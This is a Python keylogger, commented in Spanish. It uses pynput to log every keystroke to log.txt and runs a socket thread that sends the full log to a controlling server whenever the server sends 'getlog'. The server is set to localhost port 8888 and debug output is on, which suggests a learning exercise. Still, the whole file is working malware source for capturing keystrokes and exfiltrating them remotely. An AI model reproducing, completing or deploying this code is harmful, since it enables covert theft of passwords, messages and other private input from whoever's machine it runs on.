from pynput.keyboard    import Key
from pynput             import keyboard
from socket             import socket
from threading          import Thread
from time               import sleep

import sys

DEBUG_MODE = True

def print_debug(msg):
    if DEBUG_MODE: print(msg)

file = open("log.txt", "a+")

"""
Cantidad de pulsaciones que esperar para realizar un guardado automatico
"""
counter_keywords = 4

"""
Contador de teclas pulsadas
"""
now_keywords = 0

"""
Guarda el log actual y lo reabre para seguir escribiendo
"""
def saved_log():
    global file
    file.close()
    file = open("log.txt", "a+")

"""
Manejador de eventos al pulsar una tecla,
la escribimos en el archivo log.txt y aumentamos el contador
"""
def on_press(key):
    global text, counter, file, counter_keywords, now_keywords
    try:
        print_debug('alphanumeric key {0} pressed'.format(key.char))
        file.write(f'{key.char}')
    except AttributeError:
        print_debug('special key {0} pressed'.format(key))
        if key == Key.space: 
            file.write(" ")
        elif key == Key.enter: 
            file.write("\n")
        elif key == Key.backspace:
            # esto es "borra" un caracter
            # \b mueve el cursor una posicion a la izquierda
            file.write("\b \b")
        elif key == Key.esc: pass
        elif key == Key.f1: # Almacenar el log
            saved_log()
            now_keywords = 0
        else: 
            file.write(f"{key}")
            #print_debug(f"--- IGNORE ---  {key} ")
    now_keywords += 1
    if now_keywords >= counter_keywords:
        saved_log()




def on_release(key):
    print_debug('{0} released'.format(key.__str__()))
    print_debug(f"{Key.esc}")

    if key == Key.esc:
        file.close()
        sys.exit(0)

class Keylogger:
    def __init__(self, host, port):
        self.thread_kewyboard = Thread(target=self.thread_listener_keyboard)
        self.thread_client = Thread(target=self.thread_listener_socket)
        self.listener = None
        self.host = host
        self.port = port

    """
    Hilo que escucha los eventos del teclado
    """
    def thread_listener_keyboard(self):
        # Collect events until released
        with keyboard.Listener(
                on_press=on_press,
                on_release=on_release) as self.listener:
            self.listener.join()

    """
    Hilo que se conecta al servidor y envia el log cuando se le pide
    """
    def thread_listener_socket(self):
        while True:
            try:
                s = socket()
                s.connect((self.host, self.port))
                try:
                    while True:
                        if s.recv(1024).decode() == "getlog":
                            global file
                            file.close()
                            file = open("log.txt", "r")
                            data = file.read()
                            data = f"<{len(data)}>{data}"
                            print_debug(f"Sending {data}")
                            s.send(data.encode())
                            file.close()
                            file = open("log.txt", "a+")
                        else: 
                            s.send(b"<20>Unknown command")
                except ConnectionAbortedError:
                    # la conexion se cerro por parte del servidor
                    # reintentamos conectar
                    s.close()
                    try: s.connect((self.host, self.port))
                    except OSError: pass
            except ConnectionRefusedError:
                # Si el hilo del keyboard esta cerrado, cerramos todo
                if self.thread_kewyboard.is_alive():
                    print_debug("No se pudo conectar al servidor, reintentando en 1 segundos...")
                    sleep(1)
                else: sys.exit(0)

if __name__ == "__main__":
    try:
        keys = Keylogger(
            "127.0.0.1", 8888)
        keys.thread_kewyboard.start()
        keys.thread_client.start()
        keys.thread_kewyboard.join()
    except KeyboardInterrupt:
        pass
    print_debug("Hilo keyboard listener terminado")
    sys.exit(0)